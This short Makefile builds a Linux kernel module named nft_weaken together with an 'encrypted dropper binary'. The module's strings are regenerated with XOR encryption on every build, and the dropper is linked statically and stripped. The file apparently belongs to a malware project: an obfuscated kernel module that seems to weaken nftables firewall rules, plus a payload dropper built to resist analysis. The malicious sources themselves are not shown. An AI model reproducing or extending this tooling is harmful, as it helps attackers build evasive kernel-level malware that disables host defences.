KDIR ?= /lib/modules/$(shell uname -r)/build
obj-m := nft_weaken.o

# regenerate encrypted strings every build
_kxor_data.h: gen_kxor.py
	python3 gen_kxor.py > $@

nft_weaken.o: _kxor_data.h kxor.h

modules: _kxor_data.h
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
	rm -f _kxor_data.h

# build the encrypted dropper binary
dropper: drop.c gen_drop.py
	python3 gen_drop.py > _drop_data.h
	$(CC) -O2 -static -o drop drop.c
	strip -s drop

.PHONY: modules clean dropper
